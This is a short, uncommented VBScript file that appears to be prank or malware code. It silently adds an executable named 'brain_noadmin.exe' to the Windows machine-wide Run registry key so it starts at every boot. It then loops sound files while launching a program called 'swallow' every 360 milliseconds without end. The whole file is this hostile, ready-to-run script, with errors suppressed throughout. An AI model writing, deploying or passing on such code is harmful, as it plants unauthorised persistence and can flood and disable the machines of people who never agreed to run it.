On Error Resume Next
Dim temp,ret
dim ws 
Set ws=CreateObject("Wscript.Shell") 
Dim runKey,runPath 
runKey = "win"
runPath = createobject("Scripting.FileSystemObject").GetFolder(".").Path+"\brain_noadmin.exe"

ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"&runKey,runPath 

Set Player = CreateObject("wmplayer.ocx") 
Player.URL = "init.wav"
Do Until Player.playState = 1
WScript.Sleep 1
Loop

set ws=createobject("wscript.shell") 

Player.url = "233.wav"
do
do until Player.playState = 1 
ws.run "swallow"
wscript.sleep 360
loop
Player.controls.play
loop